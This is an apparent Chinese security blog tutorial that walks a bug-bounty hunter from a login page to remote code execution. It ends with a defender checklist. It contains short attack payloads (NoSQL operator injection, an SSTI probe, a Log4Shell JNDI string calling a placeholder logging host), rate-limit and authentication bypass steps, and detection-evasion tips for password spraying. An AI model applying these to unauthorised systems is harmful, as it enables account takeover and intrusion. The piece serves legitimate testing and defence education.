#  赏金猎人复盘：你十次爆破九次空，老手却能从登录框打到 RCE  
原创 升斗安全XiuXiu
                    升斗安全XiuXiu  升斗安全   2026-11-02 10:38  
  
**【文章说明】**  
- **目的**  
：本文内容仅为网络安全**技术研究与教育**  
目的而创作。  
  
- **红线**  
：严禁将本文知识用于任何**未授权**  
的非法活动。使用者必须遵守《网络安全法》等相关法律。  
  
- **责任**  
：任何对本文技术的滥用所引发的**后果自负**  
，与本公众号及作者无关。  
  
- **免责**  
：内容仅供参考，作者不对其准确性、完整性作任何担保。  
  
**阅读即代表您同意以上条款。**  
> 【内容概述】  
  
给赏金猎人和安全新人的实战手册。从拿到一个登录框开始，讲清怎么靠信息收集摸技术栈、用登录本身毛病做用户名枚举和限速绕过、从会话令牌（JWT/OAuth/Shiro）找突破口、顺着前后端分离的 API 挖未授权和越权，最后借框架漏洞（Shiro、Spring、Log4Shell）和逻辑漏洞收下 RCE。全程附真实 CVE 案例与防守 checklist，重实战、讲人话。  
  
  
拿到登录框就开 Burp 怼字典？十次九空。我自己的习惯是先花半小时把目标摸一遍，后端什么语言、是不是前后端分离、接口文档漏没漏。摸清楚了再动手，后面省一半力气。这活儿拼的不是谁字典大，是谁先看懂目标。这篇把我的完整流程过一遍：信息收集 → 登录测试 → 会话认证 → API → 框架漏洞 → 逻辑漏洞，最后给防守方一份 checklist。  
  
底线先撂这儿：下面这些只适用于你  
拿到授权的渗透、内部评估和 CTF。没授权的别碰。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qg1MKHx3jGGicruwHiaHLhBhGyUWicesmsfQoib4mFTPN7wOiap81Ww3xXGCJaQrJOiasWbMqbdhza0JoJicsicmGmgtjRuIT2L5fp0icdd4xiak0T4e0/640?wx_fmt=png&from=appmsg "")  
## 一、信息收集：动手前先搞清三件事  
  
认证入口、技术栈、泄露的接口文档，这三件直接决定你往哪打。  
  
抓登录包。F12 开 Network 勾 Preserve log（不勾的话登录一跳转请求就没了，新手最常踩），故意输错密码再提交，错密码不触发风控最适合分析。右键 Copy as cURL 存本地重放。记四样：方法+URL、参数格式、成功失败各自返回啥、认证靠 Session 还是 JWT。再编个肯定不存在的用户名登录一次，跟上一组并排比，差在哪后面枚举就利用哪。  
  
看 Cookie 认技术栈，比插件快：JSESSIONID 是 Java，PHPSESSID 是 PHP，connect.sid 是 Node，rememberMe=deleteMe 是 Shiro——重点关照对象，第五章见。前后端分离的目标，JS 就是现成接口地图，还常藏 AK/SK：grep -rniE "accesskey|secret|token" ./ 拉一遍，再试请求 app.xxxx.js.map，sourcemap 在就能还原源码。光跑一遍 grep 捡到云凭证的案例我见过不止一次。  
  
泄露端点批量扫：swagger-ui.html、/v2/api-docs、/actuator/env、/.git/config、/heapdump、/graphql。有个技巧：返回 500 且提示"请先登录"比 200 更值钱——路径真实存在只是没权限，第四章用得上；返回 404 才是真没有。  
## 二、登录测试：先浅打，别深打  
  
用户名枚举。登录失败对"用户不存在"和"密码错误"反应不一致，名单基本半公开了。四种判法：文案差、长度差、状态码差、响应时间差——这招最隐蔽，有效用户名会触发 BCrypt 哈希计算慢几十毫秒，不存在的直接跳过。Spring Security 的 CVE-2025-9824 就是时序枚举洞。Burp Intruder 用 Sniper 只标 username、密码固定弱口令，跑完按 Length/Status/Time 三列排序，聚类之外的就是有效账号。  
  
限速绕过。限速按 IP 做但 IP 从 X-Forwarded-For 读，这头是请求方自己写的——CVE-2026-11922（zenml、Appsmith 都是这毛病）就是这么绕的。发一千个请求每个换伪造 IP，全正常返回就说明按伪造 IP 分桶、绕过了。有锁定机制的别猛怼，改密码喷洒：一个弱密码怼一万个用户，单账号只失败一两次，风控基本看不见。  
  
验证码和注入。验证码按清单过：不刷新能复用、只前端校验、空值万能码、随响应回传、短信码不限频（4 位一万种能爆）。注入看格式扔：表单扔 SQL、JSON 扔 NoSQL（{"username":{"$ne":null}}）、XML 扔 XXE、用户名会被渲染就试 SSTI（{{7*7}} 返 49 是 Jinja2）。没回显用时间盲注或 DNSLog 外带，别急着放弃。  
  
有一点放前面：动手前先故意连错三四次看有没有锁定提示。有锁定就别拿字典猛怼，hydra 也收着并发（-t 1~2），改走密码喷洒——一个弱密码怼一万个用户，单账号只失败一两次，风控基本看不见。不然把真人账号打锁了，管理员马上发现有人在搞事。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGFl4oVe73zPQlZ4uRx982goNMsj7TzB7q9fCOYPGiaV84IerEXBmcM3ddErkQYoQd5YD63VRibYOEwjgXpz3Ria3KXpHNOkVwcyyw/640?wx_fmt=png&from=appmsg "")  
## 三、会话认证：门进不去就从令牌下手  
  
JWT。先解 payload 看 role/isAdmin——它们是越权线索。能打四点：alg:none（删掉签名段）、算法混淆（RS256 改 HS256 拿公钥当密钥）、弱密钥爆破（HS256 密钥常弱得离谱）、kid 注入（../../dev/null 或指向自己 JWKS）。  
  
OAuth是账号接管重灾区：redirect_uri 绕过（/callback/../evil）、state 缺失做 CSRF（CVE-2026-56425 拿 session_id 当 state 还不变 ID，固定+CSRF 一起来）、授权码重放。MFA 绕过按成本从低到高：直接跳、改响应 success、玩参数、爆破、复用。Remember Me 重点看 Shiro——走 Base64→AES→反序列化，实现不好直接就是第五章 RCE。Shiro 还有个权限绕过路径截断 /admin/;/：Shiro 看分号前半、Spring 取后半，两边不一致就绕了鉴权。  
## 四、API：登录框只是门脸  
  
前后端分离，接口数是页面的十倍往上。第一章从 JS 提的接口路径批量过一遍，500+"请先登录"的路径重点记——存在但没鉴权好。分页参数 pageSize 拉满（pageSize=999 基本等于拖库）；越权三类：路径资源替换（/student/export 改 /teacher/export）、批量赋值塞 role:admin、IDOR 改 ID 加一减一。低权限 JWT 也有用：注册拿 Token 把接口全过一遍，跟不带 Token 的响应对比，有差异就是越权面。  
## 五、框架漏洞：指纹对上直接拿 POC  
  
Shiro 反序列化（CVE-2016-4437）：响应头回 rememberMe=deleteMe 就是它。ysoserial 生成对象 → 默认密钥 AES 加密 → 塞 rememberMe Cookie → 执行命令。Shiro-721 密钥非默认也能用 Padding Oracle 磨出来，一次攻击发几万个包很正常。  
Spring Security 认证绕过（CVE-2025-22228）：BCrypt 处理超 72 字符密码时前 72 位一致就误判 true，构造超长密码过认证。  
Log4Shell：登录参数塞 ${jndi:ldap://你的DNSLog/a}，DNSLog 有记录即中。  
Struts2带 .action/.do 后缀的直接上 Struts2Scan，把已知 OGNL 注入过一遍，命中率不低。  
## 六、逻辑漏洞：工具扫不出来的都在这里  
  
条件竞争：并发注册/重置/领券，Burp Race 模式或脚本五十并发。  
密码重置是重灾区：令牌能猜（时间戳/自增 ID）、不失效（改密后旧 token 重放）、在响应里、Host 头注入改重置邮件指向、任意邮箱重置（请求里邮箱换成自己的看验证码发给谁）。  
## 七、给防守方的一份 checklist  
  
打登录框一句话：  
先摸清、再试探、能浅打别深打。防守侧日常巡检：  
- 登录失败对"用户不存在""密码错误"返回一致，掐掉枚举；  
  
- 限速 key 用服务端确认 IP 或账号维度，别用客户端可控 XFF；  
  
- 验证码服务端一次性校验，别前端、别随响应回传、别不限频；  
  
- 登录后重生成 Session ID，退出后端立即失效，Cookie 带全 HttpOnly/Secure/SameSite；  
  
- JWT 别 alg:none、别混 RS/HS、HS256 密钥够长随机、kid/jku/x5u 白名单；  
  
- OAuth redirect_uri 精确匹配、state 一次性绑定会话、授权码用完即废；  
  
- API 域名鉴权拉到主站级别，未授权和 IDOR 定期自动扫；  
  
- 框架补丁及时跟，指纹识别纳入上线前卡点。  
  
套路都是平时测试攒的，个别案例细节以官方公告为准。防御那章能直接打印当 checklist 用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qg1MKHx3jGF76ic4ic3xBv4qjgADBsdlmr7GqQ3Xn20fPbqTiaQ9y6cGImKI1kblghyyCYzrskJ0yQZvocUIlTPxwfkibVM8qpXyqLZxYdXvuwg/640?wx_fmt=png&from=appmsg "")  
  
如果这篇把一个登录框从"摸"到"打穿"的全链路给你讲明白了  
  
👍  
点个赞，让更多刚入行的安全兄弟少走弯路；  
  
💬  
关注我，后面接着扒那些框架底下藏着的 RCE 雷；  
  
🔁  
顺手转发给还在拿字典硬怼登录框的队友；  
  
📣  
推荐给做防守的兄弟，这份 checklist 贴工位上，比事后救火强。  
  
守住边界，保持敏锐。  
  
